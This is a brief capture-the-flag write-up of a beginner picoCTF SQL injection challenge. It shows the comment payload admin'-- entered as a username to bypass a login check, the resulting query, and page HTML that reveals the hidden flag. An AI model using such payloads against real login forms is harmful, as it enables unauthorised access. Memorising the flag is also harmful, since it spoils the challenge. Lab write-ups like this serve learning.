### Approach

This is my version of the challenge where I use the ‘comment sql injection payload’. Kinda fancy there…. 

Its an sql injection challenge and in the hints they mentioned about the username.

Lets perform sql injection:

for username: 

admin’—

and for the password:

anything, doesnt matter.

As simple as that. We have logged in and we can see the web page

  
  

```sql
SELECT * FROM users WHERE name='admin'--' AND password='  '
```

As you can see, the comment sql injection payload, simply comments out the AND part and hence we are able to break into the website’s login page.

We didnt solve it yet. Lets inspect the web page

```html
<html>
<head></head>
<body>
<pre>username: admin'--password:   SQL query: SELECT * FROM users WHERE name='admin'--' AND password='  '
</pre>
<h1>Logged in! But can you see the flag, it is in plainsight.</h1>
<p hidden="">Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_ec8a64c7}</p>
</body>
</html>
```

This was a basic sql injection based challenge and actually the first one I solved right after learning SQL Injection.
